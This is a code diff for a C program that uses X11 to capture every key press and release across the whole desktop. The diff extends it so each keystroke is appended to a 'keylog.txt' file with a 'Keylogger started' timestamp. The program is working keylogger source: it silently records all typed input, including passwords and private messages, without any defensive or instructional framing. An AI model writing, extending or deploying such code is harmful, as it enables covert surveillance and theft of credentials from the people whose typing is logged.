@@ -1,11 +1,19 @@
 #include <X11/Xlib.h>
-#include <X11/Xutil.h>  // Add this for XLookupString
+#include <X11/Xutil.h>  // For XLookupString
 #include <X11/keysym.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <time.h>
+
+FILE *log_file;
 
 void log_key(const char *event_type, const char *key) {
-    printf("%s: %s\n", event_type, key);  // Log key event to console (you can change it to file if needed)
+    // Print to console
+    printf("%s: %s\n", event_type, key);
+    
+    // Log to file
+    fprintf(log_file, "%s: %s\n", event_type, key);
+    fflush(log_file);  // Ensure it's immediately written to file
 }
 
 char* get_key_string(XKeyEvent *event, Display *display) {
@@ -17,7 +25,7 @@ char* get_key_string(XKeyEvent *event, Display *display) {
         buf[len] = '\0';  // Null-terminate the string
         return buf;
     } else {
-        return XKeysymToString(keysym);
+        return XKeysymToString(keysym);  // Handle special keys (like arrows, function keys)
     }
 }
 
@@ -34,6 +42,17 @@ int main() {
 
     root = DefaultRootWindow(display);  // Get the root window
 
+    // Open log file for writing
+    log_file = fopen("keylog.txt", "a");
+    if (log_file == NULL) {
+        fprintf(stderr, "Unable to open log file\n");
+        exit(1);
+    }
+
+    time_t current_time = time(NULL);
+    fprintf(log_file, "Keylogger started at %s\n", ctime(&current_time));
+    fflush(log_file);  // Write immediately
+
     // Only listen for keyboard events, without grabbing the entire keyboard
     XSelectInput(display, root, KeyPressMask | KeyReleaseMask);  // Listen for key events globally
 
@@ -43,14 +62,20 @@ int main() {
         XNextEvent(display, &event);  // Wait for the next event
         if (event.type == KeyPress) {
             char *key = get_key_string(&event.xkey, display);  // Get key string
-            log_key("Key Pressed", key);  // Log key press
+            if (key != NULL) {
+                log_key("Key Pressed", key);  // Log key press
+            }
         }
         if (event.type == KeyRelease) {
             char *key = get_key_string(&event.xkey, display);  // Get key string
-            log_key("Key Released", key);  // Log key release
+            if (key != NULL) {
+                log_key("Key Released", key);  // Log key release
+            }
         }
     }
 
+    // Close log file on exit
+    fclose(log_file);
     XCloseDisplay(display);  // Close connection to X server
     return 0;
 }
